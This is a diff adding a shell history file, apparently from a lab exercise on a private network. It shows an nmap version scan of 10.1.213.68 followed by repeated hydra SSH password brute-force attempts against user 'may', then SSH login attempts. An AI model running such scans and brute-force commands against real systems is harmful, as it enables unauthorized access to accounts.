@@ -1,0 +1,38 @@
+    1  ip a
+    2  ping 10.1.213.68
+    3  ping 10.1.213.70
+    4  ping 10.1.213.69
+    5  clear
+    6  sudo apt install hydra
+    7  claer
+    8  clear
+    9  sudo hostnamectl set-hostname equipo1ev11
+   10  sudo reboot
+   11  clear
+   12  pwd
+   13  cd ..
+   14  whoami
+   15  who
+   16  who a mi
+   17  who a me
+   18  who am i
+   19  clear
+   20  sudo apt install nmap
+   21  clear
+   22  sudo nmap -sV 10.1.213.68
+   23  pwd
+   24  sudo nano password.txt
+   25  hydra -l may -P password.txt ssh://10.1.213.68
+   26  ip a
+   27  hydra -l may -P password.txt ssh://10.1.213.68
+   28  clear
+   29  sudo nano password.txt
+   30  hydra -l may -P password.txt ssh://10.1.213.68
+   31  sudo ssh may@10.1.213.68
+   32  hydra -l may -P password.txt ssh://10.1.213.68
+   33  clear
+   34  hydra -l may -P password.txt ssh://10.1.213.68
+   35  sudo ssh may@10.1.213.68
+   36  ws
+   37  clear
+   38  history
